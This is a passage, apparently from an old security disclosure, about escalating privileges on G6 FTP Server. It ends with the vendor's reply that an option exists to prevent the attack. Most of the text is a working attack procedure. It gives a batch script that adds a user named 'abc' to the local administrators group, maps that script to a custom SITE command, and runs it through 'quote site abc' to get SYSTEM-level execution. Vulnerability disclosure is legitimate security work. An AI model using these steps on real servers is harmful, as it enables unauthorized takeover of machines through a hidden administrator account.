example,"test"

executable files to a new SITE COMMAND.see step 4 and 5

4.Simply write a .bat file named ABC.bat
---cut here -------------------------
net user abc /add
net localgroup administrators abc /add
---cut here  -------------------------

5.Map this ABC.bat to a new SITE command ,for example ,"ABC"

6.ok,now it's the time to GOT the SYSTEM privelege.
Use the "test" user logon to the FTP server,and execute the following command:
ftp>quote site abc
OK.the ABC.bat was executed as SYSTEM,you got it !

Of course ,you can Map any executable files as you want :)

Reply from the support@G6FtpServer.com
"there are already options in the software to disallow this if running in 

multiple users environment which you should also report as solution. It is true 

that it may not be obvious though"

They said that in fact there is an option to set up an FTP
administrator account

,and also need some other steps. "It is true that it may not be obvious though"
